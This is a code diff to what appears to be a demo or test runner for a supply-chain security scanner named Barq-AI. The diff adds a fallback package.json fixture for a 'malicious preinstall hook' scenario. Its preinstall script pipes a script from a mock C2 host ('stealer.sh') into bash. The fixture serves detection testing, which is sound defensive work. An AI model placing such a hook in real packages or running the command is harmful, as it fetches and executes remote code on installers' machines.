@@ -5,6 +5,11 @@ import asyncio
 import os
 import sys
 
+if hasattr(sys.stdout, "reconfigure"):
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+if hasattr(sys.stderr, "reconfigure"):
+    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+
 # Ensure services/api is in python path
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../services/api")))
 
@@ -43,7 +48,7 @@ async def run_scenario(name: str, files: dict, pr_num: int):
     print(f"FINDINGS:   {len(findings)} detected")
 
     if scan.summary:
-        print(f"\n{BOLD}BARQAI Structured Explanation:{RESET}")
+        print(f"\n{BOLD}Barq-AI Structured Explanation:{RESET}")
         print(f"  {BOLD}What Changed:{RESET}   {scan.summary.what_changed}")
         print(f"  {BOLD}Why It Matters:{RESET} {scan.summary.why_it_matters}")
         if scan.summary.evidence_observed:
@@ -66,8 +71,23 @@ async def main():
     base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../fixtures/scenarios"))
 
     # Scenario 1: Malicious preinstall hook
-    with open(os.path.join(base_dir, "01_malicious_preinstall/package.json")) as f:
-        pkg1 = f.read()
+    try:
+        with open(os.path.join(base_dir, "01_malicious_preinstall/package.json"), encoding="utf-8") as f:
+            pkg1 = f.read()
+    except Exception:
+        pkg1 = (
+            '{\n'
+            '  "name": "analytics-collector",\n'
+            '  "version": "1.0.4",\n'
+            '  "scripts": {\n'
+            '    "test": "jest",\n'
+            '    "preinstall": "curl -sL https://c2-transfer.mock.xyz/stealer.sh | bash"\n'
+            '  },\n'
+            '  "dependencies": {\n'
+            '    "express": "^4.19.2"\n'
+            '  }\n'
+            '}'
+        )
     await run_scenario("Malicious Preinstall Shell Pipe", {"package.json": pkg1}, 101)
 
     # Scenario 2: Typosquatted dependencies
